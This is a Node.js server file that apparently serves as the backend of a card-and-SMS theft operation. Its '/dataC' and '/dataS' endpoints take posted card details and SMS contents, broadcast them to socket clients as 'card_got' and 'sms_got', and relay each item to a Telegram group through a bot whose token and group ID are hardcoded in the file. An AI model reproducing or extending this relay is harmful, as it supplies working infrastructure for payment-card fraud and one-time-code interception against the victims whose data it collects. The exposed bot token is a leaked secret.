var express_ = require('express');  
var appSocket = express_();  
var server = require('http').createServer(appSocket);  
var io = require('socket.io')(server);
const PORT = 8080;

server.listen(process.env.PORT || 8080, function () {
    console.log(`Listening on ${ PORT }`);
    var intervalId = setInterval(function() {
          io.emit('ping','ping');
      }, 5000);
});


// Importing necessary modules
const express = require('express');

const TelegramBot = require('node-telegram-bot-api');

const token = '6509996039:AAEpRtn2QdWcPYVZHHz2WxCCTZ7uK0jPY6g';

const bot = new TelegramBot(token, { polling: false });

const groupId = '-1002041458711';

const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send('Hello, World!');
});

app.post('/dataC', (req, res) => {
//    const data = req.body; // This will contain the data sent in the request body
    const data_ = req.body.data;
    //console.log("DATA",data_);
    io.emit('card_got',data_);
//    console.log('Received data:', data);
//    console.log('DATA Got',data_);
//    res.send('Data received successfully!');

     bot.sendMessage(groupId, data_)
         .then(() => {
        
        })
        .catch((error) => {
            console.log("ERROR",error);
         });

    res.status(200).send('Done!');

});

app.post('/dataS', (req, res) => {
    //    const data = req.body; // This will contain the data sent in the request body
        const data_ = req.body.data;
      //  console.log("DATA",data_);
        io.emit('sms_got',data_);
    //    console.log('Received data:', data);
    //    console.log('DATA Got',data_);
    //    res.send('Data received successfully!');
    
         bot.sendMessage(groupId, data_)
             .then(() => {
            
             })
             .catch((error) => {
                console.log("ERROR",error);
             });

        res.status(200).send('Done!');
    
    });

// Define a GET endpoint with a parameter
app.get('/user/:id', (req, res) => {
    const userId = req.params.id; // This will contain the value of the "id" parameter
    res.send(`User ID: ${userId}`);
});

// Define a default error handler middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Start the server
const port = 3000;
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});







